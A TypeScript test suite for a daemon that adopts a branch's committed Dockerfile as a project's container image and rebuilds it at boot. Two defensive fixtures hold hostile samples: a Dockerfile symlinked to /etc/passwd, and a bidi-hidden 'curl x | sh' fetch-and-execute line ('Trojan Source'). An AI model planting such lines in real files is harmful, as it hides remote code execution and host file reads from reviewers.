/**
 * Teams' way out of a failing Dockerfile.lazy, against a fake docker and a real
 * git repository: adopting a branch's or task's committed Dockerfile for the
 * whole project (src/daemon/image-adoption.ts), and the microVM-only try-build
 * a fix task's agent verifies its file with (src/daemon/image-try-build.ts).
 * Nothing in src/capture/claude.ts is mocked — only the container runtime.
 */
import { describe, test, expect, beforeEach, afterEach } from 'bun:test';
import { mkdtemp, writeFile, rm, readFile, mkdir, symlink, readdir, realpath } from 'fs/promises';
import { join } from 'path';
import { tmpdir } from 'os';
import { pinDaemonBaseDir } from '../helpers/daemon-base-dir';
import { pinConfig } from '../helpers/pin-config';
import { installFakeDocker, type FakeDocker } from '../helpers/fake-docker';
import { runGit } from '../../src/utils/git';
import {
  adoptionBuildStatus,
  currentAdoptedContextDir,
  forgetAdoptionUnavailability,
  clearRefImageAdoption,
  previewImageAdoption,
  refAdoptionView,
  resetImageAdoptionForTests,
  startImageAdoption,
  ImageAdoptionError,
} from '../../src/daemon/image-adoption';
import { readAdoptedImage, writeAdoptedImage, loadValidAdoptedImage, inspectAdoptedImage } from '../../src/daemon/adopted-image';
import { getAdoptedImagePath, getAdoptedDockerfilePath, getDaemonDir } from '../../src/daemon/paths';
import { adoptedBuildContextRoot, refAdoptionContextsRoot } from '../../src/daemon/adopted-image';
import { RefAdoptionUnavailableError } from '../../src/daemon/image-adoption';
import { RunnerImageNotReadyError } from '../../src/capture/custom-image-gate';
import { resolveCustomDockerfile, ensureImage, IMAGE_TAG } from '../../src/capture/claude';
import { startRunnerImageBoot, runnerImageStatus, resetRunnerImageForTests, syncRunnerImageTarget } from '../../src/daemon/runner-image';
import { pathExists } from '../../src/utils/fs';
import type { Storage } from '../../src/storage';

const BROKEN = 'FROM alpine:3.20\nRUN exit 1\n';
const WORKING = 'FROM alpine:3.20\nCOPY tools.txt /tools.txt\n';

/** A storage that knows no tasks: every ref here is a branch name. */
const noTasks = { resolveTask: async () => ({ task: null }) } as unknown as Storage;

async function git(cwd: string, ...args: string[]) {
  const r = await runGit(args, { cwd });
  if (r.exitCode !== 0) throw new Error(`git ${args.join(' ')} failed: ${r.stderr}`);
  return r.stdout.trim();
}

/** Every adoption context directory (in the checkout; never the daemon dir). */
async function contextDirs(root: string): Promise<string[]> {
  const dir = refAdoptionContextsRoot(root);
  const entries = await readdir(dir).catch(() => [] as string[]);
  return entries.map((e) => join(dir, e)).sort();
}

/** Every file under a directory, recursively (to prove the daemon dir holds no repository files). */
async function filesUnder(dir: string): Promise<string[]> {
  const entries = await readdir(dir, { recursive: true }).catch(() => [] as string[]);
  return entries.map(String);
}

async function waitForBuild(): Promise<void> {
  for (let i = 0; i < 200; i++) {
    if (adoptionBuildStatus().state !== 'building') return;
    await Bun.sleep(25);
  }
  throw new Error('adoption build never finished');
}

describe('adopting the project image from a git ref', () => {
  let root: string;
  let base: string;
  let docker: FakeDocker;
  let undoBase: (() => void) | undefined;
  let undoConfig: (() => void) | undefined;
  let fixCommit: string;

  beforeEach(async () => {
    await resetImageAdoptionForTests();
    forgetAdoptionUnavailability();
    base = await mkdtemp(join(tmpdir(), 'lazy-image-recovery-'));
    undoBase = pinDaemonBaseDir(join(base, 'daemon'));
    docker = await installFakeDocker(base);
    root = join(base, 'repo');
    await mkdir(root);
    await git(root, 'init', '-q', '-b', 'main');
    await git(root, 'config', 'user.email', 't@example.com');
    await git(root, 'config', 'user.name', 'T');
    await writeFile(join(root, 'lazy.toml'), '[project]\nname = "t"\n[docker]\ndockerfile = ""\n');
    await writeFile(join(root, 'Dockerfile.lazy'), BROKEN);
    await git(root, 'add', '.');
    await git(root, 'commit', '-q', '-m', 'broken image');
    await git(root, 'checkout', '-q', '-b', 'fix-image');
    await writeFile(join(root, 'Dockerfile.lazy'), WORKING);
    await writeFile(join(root, 'tools.txt'), 'committed\n');
    await git(root, 'add', '.');
    await git(root, 'commit', '-q', '-m', 'working image');
    fixCommit = await git(root, 'rev-parse', 'HEAD');
    await git(root, 'checkout', '-q', 'main');
    undoConfig = pinConfig(root);
  });

  afterEach(async () => {
    await resetImageAdoptionForTests();
    undoConfig?.();
    undoBase?.();
    await rm(base, { recursive: true, force: true });
  });

  async function adopt(commit = fixCommit, contentHash?: string) {
    const preview = await previewImageAdoption(root, noTasks, 'fix-image');
    return startImageAdoption(root, noTasks, {
      ref: 'fix-image',
      commit,
      contentHash: contentHash ?? preview.candidate.contentHash,
      adoptedBy: { email: 'admin@example.com', name: 'Admin' },
    }, { resolveBinary: async () => docker.binPath });
  }

  test('the preview shows the ref\'s committed file next to the project branch\'s', async () => {
    const { candidate, main } = await previewImageAdoption(root, noTasks, 'fix-image');
    expect(candidate.content).toBe(WORKING);
    expect(candidate.commit).toBe(fixCommit);
    expect(candidate.refKind).toBe('branch');
    expect(main?.branch).toBe('main');
    expect(main?.content).toBe(BROKEN);
  });

  test('an unknown ref is a 404, never a guess', async () => {
    const err = await previewImageAdoption(root, noTasks, 'no-such-branch').catch((e) => e);
    expect(err).toBeInstanceOf(ImageAdoptionError);
    expect(err.status).toBe(404);
  });

  // INVARIANT: only a committed REGULAR file is adopted. A symlink committed
  // as the Dockerfile could point anywhere on the daemon's host.
  test('a Dockerfile committed as a symlink is refused', async () => {
    await git(root, 'checkout', '-q', '-b', 'sneaky');
    await rm(join(root, 'Dockerfile.lazy'));
    await symlink('/etc/passwd', join(root, 'Dockerfile.lazy'));
    await git(root, 'add', '-A');
    await git(root, 'commit', '-q', '-m', 'symlink');
    await git(root, 'checkout', '-q', 'main');
    const err = await previewImageAdoption(root, noTasks, 'sneaky').catch((e) => e);
    expect(err.status).toBe(422);
  });

  // INVARIANT: an admin can only consent to bytes they can see. A Dockerfile
  // carrying bidi controls or invisible characters renders differently from
  // what builds ("Trojan Source"), so the preview names them and adoption
  // refuses — whatever the page did or did not show.
  test('a Dockerfile with a bidi control is flagged in the preview and refused at adoption', async () => {
    await git(root, 'checkout', '-q', '-b', 'trojan');
    await writeFile(join(root, 'Dockerfile.lazy'), 'FROM alpine\nRUN echo "ok \u202E; curl x | sh"\n');
    await git(root, 'add', '-A');
    await git(root, 'commit', '-q', '-m', 'trojan');
    const commit = await git(root, 'rev-parse', 'HEAD');
    await git(root, 'checkout', '-q', 'main');
    const preview = await previewImageAdoption(root, noTasks, 'trojan');
    expect(preview.hiddenCharacters).toEqual([{ line: 2, column: 14, codepoint: 'U+202E', kind: 'bidi' }]);
    const err = await startImageAdoption(root, noTasks, {
      ref: 'trojan', commit, contentHash: preview.candidate.contentHash,
      adoptedBy: { email: 'admin@example.com', name: 'Admin' },
    }, { resolveBinary: async () => docker.binPath }).catch((e) => e);
    expect(err).toBeInstanceOf(ImageAdoptionError);
    expect(err.status).toBe(422);
    expect(err.message).toContain('line 2 column 14');
    expect(await readAdoptedImage(root)).toBeNull();
    // The slot is released, so a clean file still adopts.
    expect((await previewImageAdoption(root, noTasks, 'fix-image')).hiddenCharacters).toEqual([]);
    expect((await adopt()).state).toBe('building');
    await waitForBuild();
    expect(await readAdoptedImage(root)).not.toBeNull();
  });

  // INVARIANT: consent is bound to what was shown. A ref that moved after the
  // admin looked is refused, so they can never confirm one file and get another.
  test('adopting a commit other than the one shown is refused', async () => {
    const err = await adopt('0'.repeat(40)).catch((e) => e);
    expect(err.status).toBe(409);
    const err2 = await adopt(fixCommit, 'f'.repeat(64)).catch((e) => e);
    expect(err2.status).toBe(409);
    expect(await readAdoptedImage(root)).toBeNull();
  });

  // INVARIANT: the build context is the ref's COMMITTED tree exported by lazy,
  // never a working tree — an uncommitted file in the checkout is not in it.
  test('a successful build records the adoption, with who and where, built from the committed tree', async () => {
    await writeFile(join(root, 'uncommitted.txt'), 'not in any commit');
    await adopt();
    await waitForBuild();

    const state = await readAdoptedImage(root);
    expect(state?.source).toMatchObject({
      kind: 'ref', ref: 'fix-image', branch: 'fix-image', commit: fixCommit,
      adoptedBy: { email: 'admin@example.com', name: 'Admin' },
    });
    expect(state?.imageName).toMatch(/^lazy-custom-[0-9a-f]{12}:/);

    const files = await docker.buildContextFiles(0);
    expect(files).toContain('tools.txt');
    expect(files).not.toContain('uncommitted.txt');
    // Built from a lazy-owned export, which the published record then names.
    const ctx = (await currentAdoptedContextDir(root))!;
    // Built in a private staging export in the checkout, then moved into place.
    expect((await docker.buildCwds())[0].startsWith(join(refAdoptionContextsRoot(root), 'staging-'))).toBe(true);
    expect(await readFile(join(ctx, 'tools.txt'), 'utf-8')).toBe('committed\n');
    expect(await contextDirs(root)).toEqual([ctx]);
    expect(await docker.buildContextContent(0, 'dockerfile')).toBe(WORKING);

    // The whole project now resolves the adopted file, ahead of the root's.
    const resolved = await resolveCustomDockerfile(root);
    expect(resolved).not.toBeNull();
    expect(await readFile(resolved!, 'utf-8')).toBe(WORKING);
  });

  test('a failed build changes nothing but the status', async () => {
    await docker.failBuilds();
    await adopt();
    await waitForBuild();
    expect(adoptionBuildStatus().state).toBe('failed');
    expect(await readAdoptedImage(root)).toBeNull();
    expect(await contextDirs(root)).toEqual([]);
  });

  // INVARIANT: the previous adoption stays in force until the new record is
  // published. A publish that fails leaves the old record, the context it
  // names, and therefore the project's image exactly as they were.
  test('a failed publish keeps the previous adoption usable', async () => {
    await adopt();
    await waitForBuild();
    const before = (await readAdoptedImage(root))!;
    const beforeCtx = (await currentAdoptedContextDir(root))!;

    // A second commit on the branch, adopted with a record write that fails.
    await git(root, 'checkout', '-q', 'fix-image');
    await writeFile(join(root, 'Dockerfile.lazy'), WORKING + 'RUN true\n');
    await git(root, 'commit', '-qam', 'second attempt');
    const second = await git(root, 'rev-parse', 'HEAD');
    await git(root, 'checkout', '-q', 'main');
    const preview = await previewImageAdoption(root, noTasks, 'fix-image');
    await startImageAdoption(root, noTasks, {
      ref: 'fix-image', commit: second, contentHash: preview.candidate.contentHash,
      adoptedBy: { email: 'admin@example.com', name: 'Admin' },
    }, {
      resolveBinary: async () => docker.binPath,
      writeRecord: async () => { throw new Error('disk full'); },
    });
    await waitForBuild();

    expect(adoptionBuildStatus().state).toBe('failed');
    expect(await readAdoptedImage(root)).toEqual(before);
    expect(await currentAdoptedContextDir(root)).toBe(beforeCtx);
    expect(await contextDirs(root)).toEqual([beforeCtx]);
    expect(await readFile((await resolveCustomDockerfile(root))!, 'utf-8')).toBe(WORKING);
  });

  // INVARIANT: once the record is published, nothing that fails afterwards
  // (the tracker callback, old-context cleanup) may delete the context it
  // names or report the adoption failed — that silently undid adoptions.
  test('a failure after publication keeps the adoption in force', async () => {
    const preview = await previewImageAdoption(root, noTasks, 'fix-image');
    await startImageAdoption(root, noTasks, {
      ref: 'fix-image', commit: fixCommit, contentHash: preview.candidate.contentHash, adoptedBy: { email: null, name: null },
    }, { resolveBinary: async () => docker.binPath, onAdopted: async () => { throw new Error('tracker down'); } });
    await waitForBuild();
    expect(adoptionBuildStatus().state).toBe('none');
    const ctx = await currentAdoptedContextDir(root);
    expect(ctx).not.toBeNull();
    expect(await pathExists(ctx!)).toBe(true);
    expect(await readFile((await resolveCustomDockerfile(root))!, 'utf-8')).toBe(WORKING);
  });

  test('switching back while an adoption builds is refused, and the slot is not wedged', async () => {
    await adopt();
    await waitForBuild();
    await docker.slowBuilds(1);
    const second = adopt();
    await second;
    const err = await clearRefImageAdoption(root).catch((e) => e);
    expect(err.status).toBe(409);
    await waitForBuild();
    expect(adoptionBuildStatus().state).toBe('none');
    // Not wedged: switching back and a new adoption both work afterwards.
    expect(await clearRefImageAdoption(root)).toEqual({ cleared: true });
    await adopt();
    await waitForBuild();
    expect(await currentAdoptedContextDir(root)).not.toBeNull();
  });

  test('publishing a ref adoption removes a stale flat snapshot', async () => {
    await mkdir(getDaemonDir(root), { recursive: true });
    await writeFile(getAdoptedDockerfilePath(root), 'FROM old-worktree-adoption\n');
    await adopt();
    await waitForBuild();
    expect(await pathExists(getAdoptedDockerfilePath(root))).toBe(false);
  });

  // INVARIANT: one adoption build at a time, reserved before the first await
  // — two admins confirming at once cannot both start one.
  test('two concurrent adoptions: exactly one starts', async () => {
    const preview = await previewImageAdoption(root, noTasks, 'fix-image');
    const req = { ref: 'fix-image', commit: fixCommit, contentHash: preview.candidate.contentHash, adoptedBy: { email: null, name: null } };
    const results = await Promise.allSettled([
      startImageAdoption(root, noTasks, req, { resolveBinary: async () => docker.binPath }),
      startImageAdoption(root, noTasks, req, { resolveBinary: async () => docker.binPath }),
    ]);
    expect(results.filter((r) => r.status === 'fulfilled')).toHaveLength(1);
    const refused = results.find((r) => r.status === 'rejected') as PromiseRejectedResult;
    expect(refused.reason.status).toBe(409);
    await waitForBuild();
  });

  // A refused request releases the reservation it took.
  test('a refused adoption does not leave the slot reserved', async () => {
    const err = await adopt('0'.repeat(40)).catch((e) => e);
    expect(err.status).toBe(409);
    expect(adoptionBuildStatus().state).toBe('none');
  });

  // INVARIANT: sticky. A later change to the project branch's file is a
  // notice, never a switch.
  test('a later change on the project branch keeps the adoption and raises the notice', async () => {
    await adopt();
    await waitForBuild();
    expect((await refAdoptionView(root))?.mainChanged).toBe(false);

    await writeFile(join(root, 'Dockerfile.lazy'), 'FROM alpine:3.21\n');
    await git(root, 'commit', '-qam', 'another attempt on main');

    const view = await refAdoptionView(root);
    expect(view?.mainChanged).toBe(true);
    expect(await readFile((await resolveCustomDockerfile(root))!, 'utf-8')).toBe(WORKING);
  });

  // INVARIANT: a ref adoption does not expire on a version bump — expiring it
  // would drop a Teams project back onto its broken file at the next fleet
  // roll. The boot build rebuilds it under the new tag instead.
  test('a ref adoption survives a minor-version change; a worktree adoption still expires', async () => {
    await adopt();
    await waitForBuild();
    const state = (await readAdoptedImage(root))!;
    await writeAdoptedImage(root, { ...state, lazyVersion: '0.1.0' });
    expect((await inspectAdoptedImage(root)).status).toBe('valid');
    expect(await loadValidAdoptedImage(root)).not.toBeNull();

    const { source: _source, ...worktreeAdoption } = state;
    await writeAdoptedImage(root, { ...worktreeAdoption, lazyVersion: '0.1.0' });
    expect((await inspectAdoptedImage(root)).status).toBe('expired');
  });

  // INVARIANT: a project branch that cannot be READ (the root has a task
  // branch checked out mid-accept) is not a project branch whose file CHANGED —
  // that read as a false "switch back?" notice on every poll.
  test('an unreadable project branch is not reported as changed', async () => {
    await adopt();
    await waitForBuild();
    await git(root, 'checkout', '-q', '-b', 'lazy/some-task');
    const view = await refAdoptionView(root);
    expect(view?.mainChanged).toBe(false);
    expect((view as { mainUnreadable?: string }).mainUnreadable).toContain('task branch');
  });

  test('doctor names a ref adoption as adopted from its branch, not until the next upgrade', async () => {
    await adopt();
    await waitForBuild();
    const { checkAdoptedImage } = await import('../../src/doctor/sweep');
    const check = await checkAdoptedImage(root);
    expect(check?.label).toBe('Image adopted from a branch');
    expect(check?.detail).toContain('fix-image');
    expect(check?.detail).toContain('Admin');
    expect(check?.detail).not.toContain('lazy upgrade');
  });

  test('an ambiguous task reference is refused, never read as a branch name', async () => {
    const ambiguous = { resolveTask: async () => ({ task: null, ambiguousMatches: [{ id: 'a'.repeat(36), code: 'fix-a' }, { id: 'b'.repeat(36), code: 'fix-b' }] }) } as unknown as Storage;
    const err = await previewImageAdoption(root, ambiguous, 'fix').catch((e) => e);
    expect(err.status).toBe(400);
    expect(err.message).toContain('fix-a');
  });

  // INVARIANT: the HOST never holds repository contents. On Teams' microVM
  // backend the daemon dir is mounted from the host; the exported tree lives
  // in the project's checkout, inside the machine, and only the small record
  // goes in the daemon dir.
  test('the exported tree is in the checkout; the daemon dir holds only the record', async () => {
    await adopt();
    await waitForBuild();
    const ctx = (await currentAdoptedContextDir(root))!;
    expect(ctx.startsWith(join(root, '.lazy', 'adopted-image'))).toBe(true);
    const daemonFiles = await filesUnder(getDaemonDir(root));
    expect(daemonFiles.some((f) => f.endsWith('tools.txt') || f.endsWith('Dockerfile.lazy'))).toBe(false);
    expect(JSON.stringify(await readAdoptedImage(root))).not.toContain('contextDir');
  });

  // A recreated machine has a fresh clone and no exported tree: the context
  // is re-exported from the recorded commit, verified, and used — the
  // adoption survives without the host ever holding the files.
  test('a missing context (a recreated machine) is re-exported from the recorded commit', async () => {
    await adopt();
    await waitForBuild();
    const ctx = (await currentAdoptedContextDir(root))!;
    await rm(refAdoptionContextsRoot(root), { recursive: true, force: true });

    const resolved = (await resolveCustomDockerfile(root))!;
    expect(await readFile(resolved, 'utf-8')).toBe(WORKING);
    expect(await readFile(join(ctx, 'tools.txt'), 'utf-8')).toBe('committed\n');
    expect(await adoptedBuildContextRoot(root, resolved)).toBe(ctx);
  });

  // INVARIANT: a commit the repository no longer has is a FAILURE the admin
  // sees, never a silent switch back: the adoption record stays.
  test('a context whose commit is gone is reported unavailable, and the adoption is kept', async () => {
    await adopt();
    await waitForBuild();
    const record = (await readAdoptedImage(root))!;
    await writeAdoptedImage(root, { ...record, source: { ...record.source!, commit: 'f'.repeat(40) } }, { snapshot: false });
    const err = await resolveCustomDockerfile(root).catch((e) => e);
    expect(err).toBeInstanceOf(RefAdoptionUnavailableError);
    // No origin here: the reason says the fetch failed, not that the commit is gone.
    expect(err.message).toContain("not in this machine's copy");
    expect(err.message).toContain('could not fetch fix-image from origin');
    expect(await readAdoptedImage(root)).not.toBeNull();
  });

  // INVARIANT: an unavailability verdict is cached. Resolution runs on every
  // page load, builder start and launch; re-running a slow fetch each time
  // hung the very surfaces that show the failure. An explicit retry forgets it.
  test('a missing commit is fetched once, then answered from the verdict until a retry', async () => {
    await adopt();
    await waitForBuild();
    // An origin that HAS the branch but not the recorded commit: the verdict is final.
    const origin = join(base, 'origin.git');
    await git(base, 'init', '-q', '--bare', origin);
    await git(root, 'remote', 'add', 'origin', origin);
    await git(root, 'push', '-q', 'origin', 'fix-image');
    const record = (await readAdoptedImage(root))!;
    await writeAdoptedImage(root, { ...record, source: { ...record.source!, commit: 'f'.repeat(40) } }, { snapshot: false });
    await rm(refAdoptionContextsRoot(root), { recursive: true, force: true });

    const first = await resolveCustomDockerfile(root).catch((e) => e);
    expect(first.message).toContain('is not on fix-image any more');

    // Origin breaks: a second resolution must not ask it (the cached verdict stands).
    await git(root, 'remote', 'set-url', 'origin', join(base, 'gone.git'));
    const second = await resolveCustomDockerfile(root).catch((e) => e);
    expect(second.message).toBe(first.message);

    // An explicit retry asks again, and now reports the unreachable origin.
    forgetAdoptionUnavailability();
    const third = await resolveCustomDockerfile(root).catch((e) => e);
    expect(third.message).toContain('could not fetch fix-image from origin');
  });

  test('switching back clears the adoption and its context', async () => {
    await adopt();
    await waitForBuild();
    expect(await clearRefImageAdoption(root)).toEqual({ cleared: true });
    expect(await pathExists(getAdoptedImagePath(root))).toBe(false);
    expect(await contextDirs(root)).toEqual([]);
    expect(await refAdoptionView(root)).toBeNull();
  });

  // INVARIANT: never on a dockerd shared with other projects (Teams'
  // local-docker backend, or a managed daemon told no backend) — that build is
  // the project owner's explicit [docker] dockerfile choice there.
  test('a managed daemon on a shared dockerd refuses the adoption', async () => {
    const saved = { m: process.env.LAZY_MANAGED, b: process.env.LAZY_MANAGED_BACKEND };
    process.env.LAZY_MANAGED = '1';
    try {
      for (const backend of ['local-docker', undefined]) {
        if (backend) process.env.LAZY_MANAGED_BACKEND = backend; else delete process.env.LAZY_MANAGED_BACKEND;
        // Refused before anything else is read (the env decides, not the repo).
        const err = await startImageAdoption(root, noTasks, {
          ref: 'fix-image', commit: fixCommit, contentHash: 'c'.repeat(64), adoptedBy: { email: null, name: null },
        }, { resolveBinary: async () => docker.binPath }).catch((e) => e);
        expect(String(err?.message)).toContain('shared');
        expect(err.status).toBe(409);
      }
      expect(await docker.builds()).toEqual([]);
    } finally {
      if (saved.m === undefined) delete process.env.LAZY_MANAGED; else process.env.LAZY_MANAGED = saved.m;
      if (saved.b === undefined) delete process.env.LAZY_MANAGED_BACKEND; else process.env.LAZY_MANAGED_BACKEND = saved.b;
    }
  });

  // INVARIANT: a ref adoption builds against the ROOT of its exported tree,
  // even when the configured Dockerfile sits in a subdirectory — its COPY
  // paths name files relative to the repository root, as the owner's key does.
  test('a configured Dockerfile in a subdirectory builds against the tree root', async () => {
    await git(root, 'checkout', '-q', 'fix-image');
    await mkdir(join(root, 'docker'));
    await writeFile(join(root, 'docker', 'agents.Dockerfile'), WORKING);
    await git(root, 'add', '.');
    await git(root, 'commit', '-q', '-m', 'subdir dockerfile');
    const commit = await git(root, 'rev-parse', 'HEAD');
    await git(root, 'checkout', '-q', 'main');
    // The project's (root) config names the subdirectory Dockerfile.
    await writeFile(join(root, 'lazy.toml'), '[project]\nname = "t"\n[docker]\ndockerfile = "docker/agents.Dockerfile"\n');

    const preview = await previewImageAdoption(root, noTasks, 'fix-image');
    expect(preview.candidate.dockerfile).toBe('docker/agents.Dockerfile');
    await startImageAdoption(root, noTasks, {
      ref: 'fix-image', commit, contentHash: preview.candidate.contentHash, adoptedBy: { email: null, name: null },
    }, { resolveBinary: async () => docker.binPath });
    await waitForBuild();

    const ctx = (await currentAdoptedContextDir(root))!;
    // Built in a private staging export in the checkout, then moved into place.
    expect((await docker.buildCwds())[0].startsWith(join(refAdoptionContextsRoot(root), 'staging-'))).toBe(true);
    expect(await docker.buildContextFiles(0)).toContain('tools.txt');
    const adopted = (await readAdoptedImage(root))!;
    expect(adopted.dockerfilePath).toBe(join(ctx, 'docker', 'agents.Dockerfile'));
    // The rebuild path (boot build, new version) asks the same question.
    expect(await adoptedBuildContextRoot(root, adopted.dockerfilePath)).toBe(ctx);
  });

  test('a project that does not run agents in containers is refused', async () => {
    const preview = await previewImageAdoption(root, noTasks, 'fix-image');
    const err = await startImageAdoption(root, noTasks, {
      ref: 'fix-image', commit: fixCommit, contentHash: preview.candidate.contentHash,
      adoptedBy: { email: null, name: null },
    }, { resolveBinary: async () => null }).catch((e) => e);
    expect(err.status).toBe(409);
  });
});

describe('the boot build and a ref adoption', () => {
  let base: string;
  let root: string;
  let cwd: string;
  let docker: FakeDocker;
  let undoBase: (() => void) | undefined;
  let undoConfig: (() => void) | undefined;
  let fixCommit: string;

  async function until(pred: () => boolean, ms = 20_000): Promise<void> {
    const deadline = Date.now() + ms;
    while (!pred()) {
      if (Date.now() > deadline) throw new Error(`timed out; state is ${JSON.stringify(runnerImageStatus())}`);
      await Bun.sleep(25);
    }
  }

  beforeEach(async () => {
    await resetImageAdoptionForTests();
    base = await realpath(await mkdtemp(join(tmpdir(), 'lazy-image-boot-')));
    undoBase = pinDaemonBaseDir(join(base, 'daemon'));
    docker = await installFakeDocker(base);
    root = join(base, 'repo');
    await mkdir(root);
    await git(root, 'init', '-q', '-b', 'main');
    await git(root, 'config', 'user.email', 't@example.com');
    await git(root, 'config', 'user.name', 'T');
    // No `[docker] dockerfile`: the committed root Dockerfile.lazy convention.
    await writeFile(join(root, 'lazy.toml'), '[project]\nname = "t"\n[docker]\ndockerfile = ""\n');
    await writeFile(join(root, 'Dockerfile.lazy'), BROKEN);
    await git(root, 'add', '.');
    await git(root, 'commit', '-q', '-m', 'broken image');
    await git(root, 'checkout', '-q', '-b', 'fix-image');
    await writeFile(join(root, 'Dockerfile.lazy'), WORKING);
    await writeFile(join(root, 'tools.txt'), 'committed\n');
    await git(root, 'add', '.');
    await git(root, 'commit', '-q', '-m', 'working image');
    fixCommit = await git(root, 'rev-parse', 'HEAD');
    await git(root, 'checkout', '-q', 'main');
    cwd = process.cwd();
    process.chdir(root);
    undoConfig = pinConfig(root);
  });

  afterEach(async () => {
    process.chdir(cwd);
    resetRunnerImageForTests();
    await resetImageAdoptionForTests();
    undoConfig?.();
    undoBase?.();
    await rm(base, { recursive: true, force: true });
  });

  const boot = () => startRunnerImageBoot(root, { isContainerRunner: async () => ({ binary: docker.binPath }) });

  // The conventional root Dockerfile.lazy (committed, no config key) is what
  // the boot build tracks, and its failure is what the recovery surfaces show.
  test('a committed root Dockerfile.lazy is built at boot, and a failure stays failed', async () => {
    await docker.failBuilds();
    await boot();
    await until(() => runnerImageStatus().state === 'failed');
    const s = runnerImageStatus();
    expect(s.state === 'failed' && s.dockerfile).toContain('Dockerfile.lazy as committed');
  });

  test('a ref adoption replaces the failing root image for launches, and a fresh boot rebuilds it from the adopted tree', async () => {
    await docker.failBuilds();
    await boot();
    await until(() => runnerImageStatus().state === 'failed');

    await rm(join(docker.stateDir, 'fail-build'));
    const preview = await previewImageAdoption(root, noTasks, 'fix-image');
    await startImageAdoption(root, noTasks, {
      ref: 'fix-image', commit: fixCommit, contentHash: preview.candidate.contentHash,
      adoptedBy: { email: 'admin@example.com', name: 'Admin' },
    }, { resolveBinary: async () => docker.binPath, onAdopted: () => syncRunnerImageTarget() });
    for (let i = 0; i < 200 && adoptionBuildStatus().state === 'building'; i++) await Bun.sleep(25);

    const adopted = (await readAdoptedImage(root))!;
    await until(() => runnerImageStatus().state === 'ready');
    const ready = runnerImageStatus();
    expect(ready.state === 'ready' && ready.imageName).toBe(adopted.imageName);
    expect(ready.state === 'ready' && ready.dockerfile).toContain('from fix-image');
    expect(await ensureImage(docker.binPath)).toBe(adopted.imageName);

    // A VM replacement wipes the guest's images: the next boot rebuilds the
    // adopted image itself, from the lazy-owned exported tree.
    await rm(join(docker.stateDir, 'images'), { recursive: true, force: true });
    await mkdir(join(docker.stateDir, 'images'));
    resetRunnerImageForTests();
    const before = (await docker.builds()).length;
    await boot();
    await until(() => runnerImageStatus().state === 'ready');
    // (The boot also prepares lazy's default image alongside, from a temp dir.)
    const cwds = (await docker.buildCwds()).slice(before);
    expect(cwds).toContain((await currentAdoptedContextDir(root))!);
    expect(await ensureImage(docker.binPath)).toBe(adopted.imageName);
  });

  test('after a machine recreation with the adopted commit gone, the boot build reports a failure the surfaces show', async () => {
    const preview = await previewImageAdoption(root, noTasks, 'fix-image');
    await startImageAdoption(root, noTasks, {
      ref: 'fix-image', commit: fixCommit, contentHash: preview.candidate.contentHash,
      adoptedBy: { email: null, name: null },
    }, { resolveBinary: async () => docker.binPath });
    for (let i = 0; i < 200 && adoptionBuildStatus().state === 'building'; i++) await Bun.sleep(25);
    const record = (await readAdoptedImage(root))!;
    // The fresh clone lacks both the export and the commit.
    await writeAdoptedImage(root, { ...record, source: { ...record.source!, commit: 'f'.repeat(40) } }, { snapshot: false });
    await rm(refAdoptionContextsRoot(root), { recursive: true, force: true });

    await boot();
    await until(() => runnerImageStatus().state === 'failed');
    const s = runnerImageStatus();
    expect(s.state === 'failed' && s.error).toContain("not in this machine's copy");
    expect(await readAdoptedImage(root)).not.toBeNull();
    // Launches get the not-ready refusal (offer the default image), not a crash.
    await expect(ensureImage(docker.binPath)).rejects.toBeInstanceOf(RunnerImageNotReadyError);
  });
});
